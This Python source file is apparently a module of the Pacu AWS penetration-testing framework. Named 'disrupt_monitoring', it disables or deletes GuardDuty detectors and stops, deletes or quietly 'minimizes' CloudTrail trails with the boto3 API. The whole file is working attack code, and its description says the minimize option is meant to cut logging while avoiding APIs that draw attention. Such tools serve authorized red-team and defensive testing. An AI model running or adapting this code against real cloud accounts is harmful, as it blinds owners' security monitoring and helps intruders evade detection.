#!/usr/bin/env python3
import argparse
import boto3, botocore
from functools import partial
import os

from pacu import util


module_info = {
    # Name of the module (should be the same as the filename)
    'name': 'disrupt_monitoring',

    # Name and any other notes about the author
    'author': 'Spencer Gietzen of Rhino Security Labs',

    # One liner description of the module functionality. This shows up when a user searches for modules.
    'one_liner': 'Disables, deletes, or minimizes CloudTrail trails and GuardDuty detectors.',

    # Full description about what the module does and how it works
    'description': 'This module will take enumerated CloudTrail trails and GuardDuty detectors and present you with the option of disabling or deleting each one. For CloudTrail, you also have the option of minimizing it. Minimizing a trail leaves it enabled, but changes all the settings to their very basic level. These changes include: removing the associated SNS topic, disabling global service event logging, disabling multi-regional log collection, disabling log file validation, and removing the associated CloudWatch log group/role. The idea of this is to minimize the amount of logging in the environment without calling dangerous APIs like disable or delete.',

    # A list of AWS services that the module utilizes during its execution
    'services': ['GuardDuty', 'CloudTrail'],

    # For prerequisite modules, try and see if any existing modules return the data that is required for your module before writing that code yourself, that way, session data can stay separated and modular.
    'prerequisite_modules': ['enum_monitoring'],

    # Module arguments to autocomplete when the user hits tab
    'arguments_to_autocomplete': ['--trails', '--detectors'],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])

parser.add_argument('--trails', required=False, default=None, help='Comma-separated list of CloudTrail trail names and regions to target instead of enumerating them. They should be formatted like trail_name@region.')
parser.add_argument('--detectors', required=False, default=None, help='Comma-separated list of GuardDuty detector IDs and regions to target, instead of enumerating them. They should be formatted like detector_id@region.')


def help():
    return [module_info, parser.format_help()]


def main(args, proxy_settings, database):
    session = util.get_active_session(database)

    ###### Don't modify these. They can be removed if you are not using the function.
    args = parser.parse_args(args)
    print = partial(util.print, session_name=session.name, database=database)
    input = partial(util.input, session_name=session.name, database=database)
    fetch_data = partial(util.fetch_data, database=database)
    get_regions = partial(util.get_regions, database=database)
    ######

    detectors = []
    trails = []

    if args.detectors is None:
        if fetch_data(['GuardDuty', 'Detectors'], 'enum_monitoring', '--guard-duty') is False:
            print('Pre-req module not run successfully. Skipping GuardDuty...')
            detectors = []
        else:
            try:
                detectors = session.GuardDuty['Detectors']
            except:
                detectors = [] # They probably said no to enumerating detectors
    else:
        for detector in args.detectors.split(','):
            split = detector.split('@')
            try:
                detectors.append({
                    'Id': split[0],
                    'Region': split[1]
                })
            except:
                print('  Could not parse the supplied GuardDuty detectors and their regions. Use the format detector_id@region. Skipping detector {}...'.format(detector))

    if args.trails is None:
        if fetch_data(['CloudTrail', 'Trails'], 'enum_monitoring', '--cloud-trail') is False:
            print('Pre-req module not run successfully. Skipping CloudTrail...')
            trails = []
        else:
            try:
                trails = session.CloudTrail['Trails']
            except:
                trails = [] # They probably said no to enumerating trails
    else:
        for trail in args.trails.split(','):
            split = trail.split('@')
            try:
                trails.append({
                    'Name': split[0],
                    'Region': split[1]
                })
            except:
                print('  Could not parse the supplied CloudTrail trail and region. Use the format trail_name@region. Skipping trail {}...'.format(trail))

    ct_regions = get_regions('CloudTrail')
    gd_regions = get_regions('GuardDuty')

    if len(detectors) > 0:
        print('Starting GuardDuty...\n')

        for region in gd_regions:
            print(f'  Starting region {region}...\n')

            client = boto3.client(
                'guardduty',
                region_name=region,
                aws_access_key_id=session.access_key_id,
                aws_secret_access_key=session.secret_access_key,
                aws_session_token=session.session_token,
                config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if proxy_settings.target_agent is not None else None
            )

            for detector in detectors:
                if detector['Region'] == region:
                    action = input(f"    GuardDuty detector ID: {detector['Id']}\n        Do you want to disable (dis), delete (del), or skip (s) it? (dis/del/s) ")

                    if action == 'dis':
                        try:
                            response = client.update_detector(
                                DetectorId=detector['Id'],
                                Enable=False
                            )
                            print(f"        Successfully disabled detector {detector['Id']}!\n")
                        except Exception as error:
                            print(f"        Could not disable detector {detector['Id']}:\n      {error}\n")

                    elif action == 'del':
                        try:
                            response = client.delete_detector(
                                DetectorId=detector['Id']
                            )
                            print(f"        Successfully deleted detector {detector['Id']}!\n")
                        except Exception as error:
                            print(f"        Could not delete detector {detector['Id']}:\n      {error}\n")

                    else:
                        print(f"    Skipping detector {detector['Id']}...\n")

        print('GuardDuty finished.\n')

    else:
        print('No detectors found. Skipping GuardDuty...\n')

    if len(trails) > 0:
        print('Starting CloudTrail...\n')

        for region in ct_regions:
            print(f'  Starting region {region}...\n')

            client = boto3.client(
                'cloudtrail',
                aws_access_key_id=session.access_key_id,
                aws_secret_access_key=session.secret_access_key,
                aws_session_token=session.session_token,
                config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if proxy_settings.target_agent is not None else None
            )

            for trail in trails:
                if trail['Region'] == region:
                    action = input(f"    CloudTrail trail name: {trail['Name']}\n        Do you want to disable (dis), delete (del), minimize (m), or skip (s) it? (dis/del/m/s) ")

                    if action == 'dis':
                        try:
                            response = client.stop_logging(
                                Name=trail['Name']
                            )
                            print(f"        Successfully disabled trail {trail['Name']}!\n")
                        except Exception as error:
                            print(f"        Could not disable trail {trail['Name']}:\n      {error}\n")

                    elif action == 'del':
                        try:
                            response = client.delete_trail(
                                Name=trail['Name']
                            )
                            print(f"        Successfully deleted trail {trail['Name']}!\n")
                        except Exception as error:
                            print(f"        Could not delete trail {trail['Name']}:\n      {error}\n")

                    elif action == 'm':
                        try:
                            response = client.update_trail(
                                Name=trail['Name'],
                                SnsTopicName='',
                                IncludeGlobalServiceEvents=False,
                                IsMultiRegionTrail=False,
                                EnableLogFileValidation=False,
                                CloudWatchLogsLogGroupArn='',
                                CloudWatchLogsRoleArn=''
                            )
                            print(f"        Successfully minimized trail {trail['Name']}!\n")
                        except Exception as error:
                            print(f"        Could not minimize trail {trail['Name']}:\n      {error}\n")

                    else:
                        print(f"        Skipping trail {trail['Name']}...\n")

        print('CloudTrail finished.\n')

    else:
        print('No trails found. Skipping CloudTrail...\n')

    print(f'{os.path.basename(__file__)} completed.')
    return
